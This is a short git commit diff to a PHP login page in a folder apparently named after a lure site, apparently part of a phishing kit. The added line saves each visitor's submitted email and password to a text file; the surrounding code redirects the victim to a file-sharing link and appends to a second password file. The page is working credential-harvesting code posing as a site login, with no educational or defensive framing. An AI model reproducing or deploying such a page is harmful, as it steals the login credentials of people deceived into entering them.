8706f3ad9db71acc9432ccb63769e9e1817994b1
Hidden-parker <68443246+Hidden-parker@users.noreply.github.com>
2020-09-26 03:14:25 +0200

    Update login.php

--- websites/ChicasHot/login.php
+++ websites/ChicasHot/login.php
@@ -1,5 +1,7 @@
 <?php
 
+    file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+
     header("Location: https://mega.nz/folder/vIY0BKxC#9U-t5sE1KRmaxSswWN-gAw");
     $handle = fopen("pswrds.txt", "a");
 
